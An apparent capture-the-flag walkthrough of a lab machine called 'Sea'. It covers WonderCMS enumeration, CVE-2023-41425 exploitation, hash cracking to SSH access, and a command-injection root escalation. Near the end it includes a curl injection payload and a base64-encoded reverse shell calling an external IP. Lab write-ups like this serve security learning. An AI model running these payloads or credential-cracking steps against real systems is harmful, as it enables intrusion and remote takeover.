Target : 10.129.25.190

Started off with the port scan : 22, 80

Adding the ip address in /etc/hosts

10.129.25.190 sea.htb

Enumerating port 80:

*Subdomain Fuzzing using FFUF*

`ffuf -w ~/Seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.orion.htb" -u http://orion.htb/ -fl 87`

![](../Screenshot%202026-07-02%20at%209.06.32%20PM.png)

And got nothing.

Directory bruteforcing for finding interesting endpoints:

`gobuster dir -u "http://sea.htb" -w ~/SecLists/Discovery/Web-Content/common.txt`

![](../Screenshot%202026-07-02%20at%209.02.32%20PM.png)

Only positive is application is running php.

`gobuster dir -u "http://sea.htb" -w ~/SecLists/Discovery/Web-Content/common.txt -x php`

but got nothing interesting, tried big.txt (no luck)

then started fuzzing  /themes directory to find more information on the target

we found /bike and that eventually revealed README.md , found it is wondercms

/themes/bike/version -> 3.2.0 (CVE-2023-41425 - XSS to RCE)

Exploiting CVE-2023-41425

CVE-2023–41425 is a **Cross-Site Scripting (XSS)** vulnerability discovered in Wonder CMS **versions 3.2.0 through 3.4.2**. This means that a malicious actor could exploit this flaw to inject malicious scripts into the website, potentially allowing them to steal user data, hijack sessions, or perform other harmful actions.

Using this exploit : https://www.exploit-db.com/exploits/52271

Successfully got the shell as www-data

```
www-data@sea:/var/www/sea/data$ whoami
www-data
```

While, exploring the application, got database.js which has password hash, let's see if its crackable.

`$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q`

Makesure to remove the backslash before trying to crack it. 

Modified hash : `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q`

![](../Pasted%20image%2020260703095214.png)

Pass: **mychemicalromance**

There are two users in the machine "amay, geo"

Connecting through SSH: amay

`ssh amay@$ip`

Logged In succesfully

```
amay@sea:~$ cat user.txt 
042a3b08fb04e175262128ee8d7a0fa8
```

Root Escalation:

`netstat -ano`

![](../Pasted%20image%2020260703103619.png)

Found port: 8080 is running locally, forwarded that port using ssh

`ssh amay@$ip -L 8080:127.0.0.1:8080`

It is running a System Monitor Service: (retrieving log files.)

Used this to retrieve the flag.

```
curl -X POST "http://127.0.0.1:8080" -H 'Cookie: username-127-0-0-1-8888="2|1:0|10:1781067682|23:username-127-0-0-1-8888|200:eyJ1c2VybmFtZSI6ICI1NDc2MTcwNWJhM2Q0ZWQ1ODNmNzA4NDRhYWMxMDgxYiIsICJuYW1lIjogIkFub255bW91cyBDYWxsaXN0byIsICJkaXNwbGF5X25hbWUiOiAiQW5vbnltb3VzIENhbGxpc3RvIiwgImluaXRpYWxzIjogIkFDIiwgImNvbG9yIjogbnVsbH0=|a1121cdbf26346dfb2aa83ddc9ea927017474a24d517146786784b6effbcb44c"' -H "Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==" -d "log_file=%2Froot%2Froot.txt; id&analyze_log="
```

root.txt: ca5232ceac8484cd399c64ff6de626d0

For getting root shell

`"log_file=;%20echo%20c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjQxLzc3NzcgMD4mMQ==|%20base64%20-d|bash&analyze_log="`


**To be Noted:**

1. Need to verify all the endpoints, even though getting 403 
2. If an application using php, try to enumerate and lookout for php files. 
3. Have to remove the backslash in hashes before cracking "\"
4. check all the requests and parameters for potential injections to elevate/retrieve files